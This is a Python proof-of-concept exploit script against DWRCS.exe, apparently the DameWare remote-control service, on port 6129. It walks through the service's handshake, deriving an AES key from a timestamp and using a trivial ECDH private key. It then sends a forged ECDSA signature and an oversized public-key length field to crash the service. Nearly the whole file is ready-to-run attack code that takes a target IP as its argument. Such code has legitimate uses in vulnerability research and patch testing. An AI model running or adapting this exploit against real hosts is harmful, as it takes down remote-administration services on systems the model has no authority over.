import sys, socket, os,string, binascii, argparse
from struct import *
from Crypto.Cipher import AES
from Crypto.Hash import HMAC,SHA512
from Crypto.Protocol import KDF 

# Got it from the Internet 
def hexdump(src, length=16):
  DISPLAY = string.digits + string.letters + string.punctuation
  FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
  lines = []
  for c in xrange(0, len(src), length):
    chars = src[c:c+length]
    hex = ' '.join(["%02x" % ord(x) for x in chars])
    if len(hex) > 24:
      hex = "%s %s" % (hex[:24], hex[24:])
    printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
    lines.append("%08x:  %-*s  %s\n" % (c, length*3, hex, printable))
  return ''.join(lines)

def dump(title, data):
  print '---[ %s ] --- ' % (title)
  print hexdump(data) 

def recvall(sock, n):
  data = ''
  while len(data) < n:
      packet = sock.recv(n - len(data))
      if not packet:
          return None
      data += packet
  return data

def aes_cbc_decrypt(data,key,iv):
  cipher = AES.new(key, AES.MODE_CBC, iv)
  return cipher.decrypt(data)


def int2bin(i):
  hs = format(i, 'x')
  if (len(hs) % 2):
    hs = '0' + hs
  return binascii.unhexlify(hs)



#
# MAIN
#
desc = 'This PoC sends a large length field in MSG_000105b9 to crash dwrcs.exe.'
desc += '\nYou may need to run more than once to crash dwrcs.exe.'

arg_parser = argparse.ArgumentParser(desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-p', type=int, default=6129, help='DWRCS.exe port (Default: 6129)')
arg_parser.add_argument('-s', type=int, default=0x1ffffff, help='Length value (Default: 0x1ffffff)')

args = arg_parser.parse_args()

host = args.t
port = args.p
long_len = args.s

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))

# Read MSG_TYPE_VERSION
res = s.recv(0x28)

(type,) = unpack_from('<I', res)
if type != 0x00001130:
  print 'Received message not MSG_TYPE_VERSION'
  s.clos()
  sys.exit(1)

# Send MSG_TYPE_VERSION
req = pack('<I4sddIIII', 0x1130,'\x00',12.0,0.0,4,0,0,1)
s.sendall(req)

# Read MSG_CLIENT_INFORMATION_V7
res = recvall(s,0x3af8)
(type,) = unpack_from('<I', res)
if type != 0x00011171:
  print 'Received message not MSG_CLIENT_INFORMATION_V7'
  s.close()
  sys.exit(1)

#dump('server MSG_CLIENT_INFORMATION_V7', res)

# Pick out the datetime string
datetime = '' 
i = 8
b = res[i]
while(b != '\x00'):
  datetime += b 
  i = i + 2 
  b = res[i]

salt ='\x54\x40\xf4\x91\xa6\x06\x25\xbc' 
prf = lambda p,s: HMAC.new(p,s,SHA512).digest()
key = KDF.PBKDF2(datetime, salt, 16, 1000, prf) 
dump('Derived key from passwd ' + datetime, key)

#
# Send MSG_CLIENT_INFORMATION_V7
#
# Should be able to use the one sent by the server
req = res
s.sendall(req)

# Read MSG_TYPE_RSA_CRYPTO_C_INIT
res = recvall(s,0x1220)
(type,enc_len,) = unpack_from('<II', res)
if type != 0x000105b8:
  print 'Received message not MSG_TYPE_RSA_CRYPTO_C_INIT'
  s.close()
  sys.exit(1)

#dump('server MSG_TYPE_RSA_CRYPTO_C_INIT', res)

# Encrypted params at offset 0x100c
crypt = res[0x100c:0x100c+enc_len]
iv ='\x54\x40\xF4\x91\xA6\x06\x25\xBC\x8E\x84\x56\xD6\xCB\xB7\x40\x59'
params = aes_cbc_decrypt(crypt,key,iv)
dump('Encrypted server MSG_TYPE_RSA_CRYPTO_C_INIT params', crypt)
dump('Decrypted server MSG_TYPE_RSA_CRYPTO_C_INIT params', params)

# Send  MSG_TYPE_RSA_CRYPTO_C_INIT
# Should be able to use the one sent by the server
req = res
s.sendall(req)


# Read MSG_000105b9
res = recvall(s,0x2c2c)
(type,) = unpack_from('<I', res)
if type != 0x000105b9:
  print 'Received message not MSG_000105b9'
  s.close()
  sys.exit(1)

#dump('server MSG_000105b9 (1)', res)

# Get server DH public key
(pubkey_len,) = unpack_from('<I', res, 0x140c)

if(pubkey_len != 0x2b):
  print "server public key size not 0x2b, 'Allow only FIPS Mode' not set?"
  s.close()
  sys.exit(1)

srv_pubkey = res[0x100c:0x100c+pubkey_len]
dump('server ECDH public key', srv_pubkey)

p  = 0x06aafbfb706bc937ab4d8611b2395f67566bd98a6d
a  = 0x06aafbfb706bc937ab4d8611b2395f67566bd98a6a
b  = 0x0c6e5ca49c469dcdd25842bde319b2fbffe342e5
gx = 0x02258111636005225f5a3d4da6716b36d3bb14f9d1
gy = 0x035c13776b8a3bc9b165404fbb72e064e48ec3c42f
n  = 0x6aafbfb706bc937ab4d850b1b097c5316916c6d1

# d = 1
clt_pubkey  = '\x04' + int2bin(gx) + int2bin(gy)
dump('client ECDH public key', clt_pubkey)
shared_secret = srv_pubkey[1:0x16]
dump('ECDH shared secret', shared_secret)

# Compute the sum of the bytes in the shared secret
clt_sum = 0
for b in shared_secret: clt_sum = clt_sum + ord(b)

buf = list(res);

# Fill in client ECDH public key and length 
buf[0x1418:0x1418+len(clt_pubkey)] = clt_pubkey
buf[0x1818:0x1818 + 4] = pack('<I',len(clt_pubkey))

req = ''.join(buf)
#dump('client MSG_000105b9 (1)', req)
s.sendall(req)

#
# Server sends back the length and addsum of the shared secret
#
res = recvall(s,0x2c2c)
(type,) = unpack_from('<I', res)
if type != 0x000105b9:
  print 'Received message not MSG_000105b9'
  s.close()
  sys.exit(1)

#dump('server MSG_000105b9 (2)', res)

(srv_sum,) = unpack_from('<I', res, 0x1820)

# Byte sum of the shared secret should match on the client and server
print 'client-computed sum of the ECDH shared secret: 0x%x' % (clt_sum)
print 'server-computed sum of the ECDH shared secret: 0x%x' % (srv_sum)
if clt_sum != srv_sum:
  print "Client-computed sum of the ECDH shared secret not matched with server's."
  s.close()
  sys.exit(1)
# Fake ECDSA signature
sig_r = 'R' * 0x15 
sig_s = 'S' * 0x15
sig = '\x02' + pack('B', len(sig_r)) + sig_r
sig = '\x02' + pack('B', len(sig_s)) + sig_s
sig = '\x30' + pack('B', len(sig)) + sig

buf = list(res)
# Fill in the length and sum of the client-computed ECDH shared secret
buf[0x1410: 0x1410 + 4] = pack('<I',len(shared_secret))
buf[0x1414: 0x1414 + 4] = pack('<I',clt_sum) 

# Fill in the ECDSA signature and sig len
buf[0x1824: 0x1824 + len(sig)] = sig
buf[0x2024: 0x2024 + 4] = pack('<I', len(sig))

# Fake EC public key
pubkey = 'P' * 0x800
buf[0x2028: 0x2028 + len(pubkey)] = pubkey
buf[0x2828: 0x2828 + 4] =  pack('<I', len(pubkey))

print 'Attack using 0x%X for EcPubKeyLen ...' % (long_len) 
buf[0x2828: 0x2828 + 4] =  pack('<I', long_len)

# Fill in the rest of the msg
buf[0x282c:0x2c2c] = 'A' * 0x400 

req = ''.join(buf)
#dump('client MSG_000105b9 (2)', req)
s.sendall(req)
print "Did DWRCS.exe die?"
